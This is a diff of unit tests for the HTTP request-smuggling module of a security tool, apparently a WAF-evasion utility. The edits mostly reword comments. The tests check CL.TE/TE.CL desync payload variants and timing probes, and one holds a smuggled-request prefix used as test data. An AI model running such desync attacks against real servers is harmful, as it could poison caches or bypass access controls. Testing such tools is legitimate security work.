+        // Detection variants accept an empty prefix, they're
         // pure timing-probes. Confirm `build_payload("detect-cl-te", ..., "")`
         // succeeds and the output contains no caller-supplied
         // smuggled request bytes.
@@ -1855,7 +1855,7 @@ mod tests {
     #[test]
     fn dry_run_hex_format_emits_no_io() {
         // Smoke-test that build_payload is the only work the
-        // dry-run path does — no DNS, no TCP.
+        // dry-run path does (no DNS, no TCP).
         let info = VARIANTS.iter().find(|v| v.key == "dual-cl").unwrap();
         let p = build_payload(info, "example.com", "GET / HTTP/1.1\r\nHost: x\r\n\r\n").unwrap();
         assert!(p.raw_bytes.len() > 50);
@@ -1865,17 +1865,17 @@ mod tests {
     #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
     async fn time_first_byte_returns_timeout_value_when_server_silent() {
         // Spawn a TcpListener that accepts the connection and
-        // does NOTHING — never writes a response. Confirms our
+        // does NOTHING, never writes a response. Confirms our
         // timeout path returns roughly `timeout_secs * 1000` and
         // doesn't hang the test runner. The accepted socket is
-        // bound to `_sock` (not `_`) on purpose — `let _ = ...`
+        // bound to `_sock` (not `_`) on purpose: `let _ = ...`
         // drops immediately and would close the connection,
         // making `read` return Ok(0) instantly instead of hanging.
         //
         // timeout_secs=3 rather than 1: on Windows under heavy
         // parallel test load the loopback TCP connect can take up to
         // ~1s itself (OS stack loaded by other tests). A 1s budget
-        // was too narrow — the connect timeout fired before the server
+        // was too narrow, the connect timeout fired before the server
         // could accept, returning Err instead of Ok(elapsed). 3s gives
         // headroom for the connect while still proving the READ timeout
         // fires before the server holds the socket open (10s).
@@ -1885,7 +1885,7 @@ mod tests {
         tokio::spawn(async move {
             if let Ok((_sock, _peer)) = listener.accept().await {
                 // Hold the socket open without writing anything
-                // for 10s — longer than the probe timeout.
+                // for 10s (longer than the probe timeout).
                 tokio::time::sleep(Duration::from_secs(10)).await;
             }
         });
@@ -1906,7 +1906,7 @@ mod tests {
     #[serial_test::serial]
     #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
     async fn time_first_byte_returns_quickly_when_server_responds() {
-        // `#[serial_test::serial]` — binds a fresh `127.0.0.1:0`
+        // `#[serial_test::serial]`: binds a fresh `127.0.0.1:0`
         // listener; under Windows parallel test runs the ephemeral-
         // port + slow TIME_WAIT recycle path produces spurious
         // `connection refused` failures.
@@ -1982,7 +1982,7 @@ mod tests {
 
     #[test]
     fn unescape_prefix_unknown_escape_is_preserved_verbatim() {
-        // `\x` is not a recognised escape — keep the backslash
+        // `\x` is not a recognised escape, keep the backslash
         // so a future reader (the smuggling engine) can tell
         // it apart from a real `x`. The current implementation
         // emits the `\\` then continues, so the result is `\x`.
@@ -1996,7 +1996,7 @@ mod tests {
     #[test]
     fn unescape_prefix_handles_consecutive_crlf_groups() {
         // The HTTP header terminator `\r\n\r\n` is the canonical
-        // boundary — confirm two adjacent groups both unescape.
+        // boundary (confirm two adjacent groups both unescape).
         let raw = "X\\r\\n\\r\\nY";
         assert_eq!(unescape_prefix(raw), "X\r\n\r\nY");
     }
@@ -2059,7 +2059,7 @@ mod tests {
         for required_key in ["detect-cl-te", "detect-te-cl"] {
             assert!(
                 VARIANTS.iter().any(|v| v.key == required_key),
-                "run_detect hardcodes `{required_key}` but it is absent from VARIANTS catalogue — \
+                "run_detect hardcodes `{required_key}` but it is absent from VARIANTS catalogue. \
                  `wafrift smuggle detect` would return exit code 2 for all users"
             );
         }
@@ -2082,7 +2082,7 @@ mod tests {
 
     #[test]
     fn variants_catalogue_keys_are_lowercase() {
-        // parse_variant_name lowercases input before comparing — the
+        // parse_variant_name lowercases input before comparing, the
         // catalogue rows MUST themselves be lowercase or the
         // case-insensitive matching is dead code.
         for v in VARIANTS {
@@ -2134,7 +2134,7 @@ mod tests {
     #[test]
     fn build_payload_smuggled_prefix_appears_in_wire_for_cl_te() {
         // The smuggled HTTP request bytes the operator passes MUST
-        // appear somewhere in the produced wire bytes — that's the
+        // appear somewhere in the produced wire bytes, that's the
         // whole point of the attack. A refactor that dropped the
         // prefix would generate a benign request.
         let prefix = "GET /smuggled-marker HTTP/1.1\r\nHost: x\r\n\r\n";
@@ -2154,7 +2154,7 @@ mod tests {
     // F126 regression: TCP connect timeout (unreachable host, blocked
     // port) must surface as Err, NOT as a phantom-elapsed measurement
     // that gets compared against the baseline and produces a false
-    // DESYNC. Aim at port 1 on localhost — Windows + most Linux
+    // DESYNC. Aim at port 1 on localhost. Windows + most Linux
     // configs refuse it, but the connect should ERROR fast rather
     // than hang. Either way we want Err out of time_first_byte, not
     // a giant phantom Ok value.
@@ -2175,7 +2175,7 @@ mod tests {
                 );
             }
             Ok(elapsed_ms) => panic!(
-                "unreachable host returned phantom Ok({elapsed_ms}) ms — \
+                "unreachable host returned phantom Ok({elapsed_ms}) ms. \
                  F126 regression: would feed into delta calculation and \
                  false-flag DESYNC"
             ),
@@ -2199,7 +2199,7 @@ mod tests {
         assert!(r.unwrap_err().contains("made-up"));
     }
 
-    // Fix #8 tests — annotate_lone_lf visibility helper.
+    // Fix #8 tests (annotate_lone_lf visibility helper).
 
     #[test]
     fn annotate_lone_lf_replaces_standalone_lf_with_visible_token() {
@@ -2216,7 +2216,7 @@ mod tests {
 
     #[test]
     fn annotate_lone_lf_does_not_replace_crlf() {
-        // \r\n is a legitimate HTTP line ending — must NOT be annotated.
+        // \r\n is a legitimate HTTP line ending (must NOT be annotated).
         let input = "GET / HTTP/1.1\r\nHost: x\r\n\r\n";
         let out = annotate_lone_lf(input);
         assert!(
